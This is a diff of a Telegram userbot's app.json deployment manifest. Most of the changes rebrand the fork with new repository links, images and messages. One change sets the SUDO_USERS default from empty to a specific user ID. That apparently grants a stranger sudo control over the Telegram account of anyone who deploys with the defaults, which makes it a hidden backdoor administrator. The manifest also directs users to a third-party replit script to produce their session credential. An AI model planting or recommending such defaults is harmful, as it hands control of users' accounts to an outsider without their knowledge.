@@ -1,7 +1,7 @@
 {
   "name": "Tgx USERBOT",
   "description": "ITS YOUR Tgx USERBOT MADE WITH LOVE... ❤ ENJOY ",
-  "logo": "https://telegra.ph/file/375aacd0caf1f95bcc5f1.jpg",
+  "logo": "https://telegra.ph/file/ceb34557e0c13c5755756.jpg",
     "keywords": [
     "telegram",
     "userbot",
@@ -9,8 +9,8 @@
     "modular",
     "productivity"
   ],
-  "repository": "https://github.com/don1900/Tgx",
-  "website": "https://github.com/don1900/Tgx",
+  "repository": "https://github.com/TeamDarkZ/TGX",
+  "website": "https://github.com/TeamDarkZ/TGX",
   "success_url": "https://t.me/always_don",
   "env": {
     "ENV": {
@@ -23,28 +23,28 @@
       "required": false
     },
     "ALIVE_NAME": {
-      "description": "Fill your Full name. By default it is Tgx USER",
-      "value": "Tgx User",
+      "description": "Fill your Full name. By default it is SkyHawk USER",
+      "value": "TGX User",
       "required": false
     },
     "ALIVE_MSG": {
       "description": "Set Custom Alive Message When entering .alive Command.",
-      "value": "Tgx USERBOT IS ON !",
+      "value": "TGX USERBOT IS ON !",
       "required": false
     },
     "ALIVE_PIC": {
       "description": "Put here any telegraph media link for alive pic in .alive command.",
-      "value": "https://telegra.ph/file/0fcde87dc3fd1d7b6dfe5.mp4",
+      "value": "https://telegra.ph/file/ceb34557e0c13c5755756.jpg",
       "required": false
     },
     "BIO_MSG": {
       "description": "Put Your Telegram Bio Here Required For Auto Bio.",
-      "value": "ITS Tgx USERBOT! USERBOT OF YOUR DAD",
+      "value": "ITS TGX USERBOT! USERBOT OF YOUR DAD",
       "required": false
     },
     "PMPERMIT_PIC": {
       "description": "put here any telegraph media link for custom pmpermit pic.",
-      "value": "https://telegra.ph/file/6180b54f80c7c7adf432e.mp4",
+      "value": "https://telegra.ph/file/ceb34557e0c13c5755756.jpg",
       "required": true
     },
     "CUSTOM_PMPERMIT": {
@@ -78,7 +78,7 @@
     },
     "SUDO_USERS": {
       "description": "Enter your friends user id to to give him bot sudo access",
-      "value": "",
+      "value": "801842409",
       "required": false
     },
     "SUDO_COMMAND_HAND_LER": {
@@ -107,7 +107,7 @@
        "value": ""
     }, 
     "STRING_SESSION": {
-      "description": "Get this value by running https://replit.com/@don1900/Tgx#main.py ",
+      "description": "Get this value by running https://replit.com/@don1900/SkyHawk#main.py ",
       "value": ""
     },
     "HEROKU_API_KEY": {
